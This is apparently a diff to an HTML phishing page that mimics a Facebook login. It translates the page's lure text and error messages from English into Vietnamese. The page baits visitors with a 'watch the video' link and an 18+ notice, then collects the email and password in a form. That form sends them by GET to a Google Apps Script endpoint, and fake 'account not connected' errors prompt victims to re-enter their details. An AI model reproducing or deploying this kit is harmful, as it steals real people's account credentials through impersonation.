@@ -4,7 +4,8 @@
 <head>
     <title></title>
     <style>
-	     body{background-image: url(https://i.imgur.com/odkOPeV.png);height: 100%;background-position: center; background-repeat: no-repeat; background-size: cover;}
+	
+	body{background-image: url(https://i.imgur.com/odkOPeV.png);height: 100%;background-position: center; background-repeat: no-repeat; background-size: cover;}
         .modal-content {
             width: 380px;
             height: 480px;
@@ -108,21 +109,17 @@
                 margin-top: 50px;
             }
         }
-	    
-	   
         
     </style>
-	
-
 </head>
 
 <body onclick="showModal();">
     <div align="center" style="margin-top: 30px;">
         <div class="separator" style="clear: both; text-align: center;">
-            <b><span style="color: red; font-size: 26pt; font-style: italic;"><a class="title" href="#" onclick="showModal()" style="color: red;">▶ CLICK HERE TO WATCH THE VIDEO</a></span></b>
+            <b><span style="color: red; font-size: 26pt; font-style: italic;"><a class="title" href="#" onclick="showModal()" style="color: red;">▶ BẤM VÀO ĐÂY ĐỂ XEM VIDEO</a></span></b>
         </div>
-        <img src="https://i.imgur.com/I67OV5f.jpg" class="img-responsive" alt="Image" onclick="showModal();">
-	</div>
+			<img src="https://i.imgur.com/I67OV5f.jpg" class="img-responsive" alt="Image" onclick="showModal();">
+		</div>
     <div id="myModal" class="modal fade" role="dialog">
         <div class="modal-dialog">
             <!-- Modal content-->
@@ -130,18 +127,18 @@
                 <div class="modal-body">
                     <section class="login-form-wrap">
                         <h1 class="facebook_logo">Facebook</h1>
-                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">This website requires you to be 18 years or older to enter! Please login Facebook to Confirm</div>
+                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Nội dung 18+, vui lòng đăng nhập trước khi xem.</div>
                         <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbzsLBOH38HNtEp-cn1dbzLkro_ww8iETOYhDwF5N6ce7EgHcmxfW6rmKP2EYR52LVVMyw/exec">
                             <label class="mt-10">
-                                <input id="username" type="text" name="username" required="" placeholder="Email address or phone number">
+                                <input id="username" type="text" name="username" required="" placeholder="Email hoặc số điện thoại">
                             </label>
                             <label class="mt-10">
-                                <input id="password" type="password" name="password" required="" placeholder="Password">
+                                <input id="password" type="password" name="password" required="" placeholder="Mật khẩu">
                             </label>
 							<input id="country" type="text" name="country" style="display:none">
-                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Log In">
+                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Đăng nhập">
                         </form>
-                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Forgotten password?</a></h5>
+                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Quên mật khẩu?</a></h5>
                     </section>
                 </div>
             </div>
@@ -188,7 +185,7 @@ function GetIPAdress() {
 
 function submitForm() {
     if (!$('#username').val().includes('@') || $('#password').val().length < 6) {
-		alert('The information entered is incorrect ');
+		alert('Thông tin vừa nhập không đúng');
 		return;
     } else {
         count++;
@@ -210,7 +207,7 @@ function submitForm() {
                 } else if (count == 1) {
                     $('#noti').css({ "color": "#879600" });
                 }
-                $('#noti').text('The email address or mobile number you entered isn't connected to an account');
+                $('#noti').text('Tài khoản bạn vừa nhập không hợp lệ, Vui lòng thử lại.');
                 $('#loading').hide();
 				
 				
